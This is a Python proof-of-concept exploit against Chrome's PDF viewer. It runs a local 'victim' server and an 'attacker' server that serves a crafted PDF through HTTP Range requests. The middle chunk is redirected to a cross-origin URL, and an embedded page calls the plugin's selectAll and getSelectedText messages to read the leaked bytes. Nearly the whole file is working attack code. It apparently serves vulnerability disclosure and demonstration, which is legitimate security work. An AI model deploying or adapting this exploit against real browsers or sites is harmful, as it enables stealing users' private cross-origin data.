#!/usr/bin/env python

try:  # Py2
    from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
except ImportError:  # Py3
    from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread

victim_port = 8082
attacker_port = 8081
# URL of server from where we want to read data:
victim_url = 'http://localhost:%d/not-a-pdf' % victim_port
# The demo is self-contained, but example.com would also work
# victim_url = 'https://example.com'

# Number of bytes to steal
victim_leak_size = 1000


def parseByteRange(http_range):
    (start, _, end) = http_range.replace('bytes=', '').partition('-')
    return int(start), int(end)

# Victim server


class OtherOriginHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        http_range = self.headers.get('Range')
        assert http_range, 'Expected Range request on victim server in PoC'
        start, end = parseByteRange(http_range)
        size = 1 + end - start
        some_response = b'This cross-origin data should not be visible\n'
        some_response = some_response * (size // len(some_response) + 1)
        some_response = some_response[0:size]
        self.send_response(206)
        self.send_header('Cache-Control', 'no-cache')
        self.send_header('Content-Range', 'bytes %d-%d/*' % (
            start, end))
        self.end_headers()
        self.wfile.write(some_response)


def StartOtherServer():
    print("Started victim server at port %d" % victim_port)
    HTTPServer(('127.0.0.1', victim_port), OtherOriginHandler).serve_forever()
Thread(target=StartOtherServer).start()


# Attacker below

head_pdf = b'''%PDF
1 0 obj<<>>stream
BT/F1 1 Tf 0 0 Td('''

first_chunk_len = len(head_pdf)

tail_pdf_front = b''') Tj
ET
endstream
endobj
2 0 obj
<</Type/Catalog/Pages 3 0 R>>
endobj
3 0 obj
<</Type/Pages/Count 1/Kids[4 0 R]/MediaBox [0 0 9 9]>>
endobj
4 0 obj
<</Type/Page/Parent 3 0 R/Resources<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Arial>>>>>>/Contents 1 0 R>>
endobj
'''  # NOQA
tail_pdf_back = b'''

trailer
<</Root 2 0 R>>
'''

# The total file size must be at least kMinFileSize in document_loader.h, to
# ensure that Chrome uses Range requests.
# We will artifically pad the last chunk to ensure that the requirement is met.
kMinFileSize = 64 * 1024
tail_pdf_pad_len = kMinFileSize - len(tail_pdf_front) - len(tail_pdf_back)
tail_pdf = tail_pdf_front + b' ' * tail_pdf_pad_len + tail_pdf_back
last_chunk_len = len(tail_pdf)

demo_html = b'''
<embed type="application/pdf" src="/poc.pdf"></embed>
<pre></pre>
<script>
window.onmessage = function(event) {
    if (event.data.type === 'getSelectedTextReply') {
        document.querySelector('pre').textContent = event.data.selectedText || 'No data';
    }
};
var plugin = document.querySelector('embed');
plugin.postMessage({type: 'selectAll'});
plugin.postMessage({type: 'getSelectedText'});
</script>
'''  # NOQA

totalSize = len(head_pdf) + victim_leak_size + len(tail_pdf)


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path != '/poc.pdf':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(demo_html)
            return

        http_range = self.headers.get('Range')
        if not http_range:
            self.send_response(200)
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Accept-Ranges', 'bytes')
            self.send_header('Content-Type', 'application/pdf')
            self.send_header('Content-Length', str(totalSize))
            self.end_headers()
            return

        start, end = parseByteRange(http_range)

        if start == 0:
            # Reply with first chunk, regardless of the requested byte range.
            self.send_response(206)
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Content-Range', 'bytes 0-%d/%d' % (
                first_chunk_len - 1, totalSize))
            self.end_headers()
            self.wfile.write(head_pdf)
            return

        if end > totalSize - len(tail_pdf) - 1:
            # Last chunk
            last_chunk_len = min(len(tail_pdf), 1 + end - start)
            self.send_response(206)
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Content-Range', 'bytes %d-%d/%d' % (
                totalSize - last_chunk_len, totalSize - 1, totalSize))
            self.end_headers()
            self.wfile.write(tail_pdf[-last_chunk_len:])
            return

        # Second chunk (cross-origin!!!)
        self.send_response(302)
        self.send_header('Cache-Control', 'no-cache')
        self.send_header('Location', victim_url)
        self.end_headers()


print("Starting attacker server at http://localhost:%d" % attacker_port)
HTTPServer(('127.0.0.1', attacker_port), MyHandler).serve_forever()
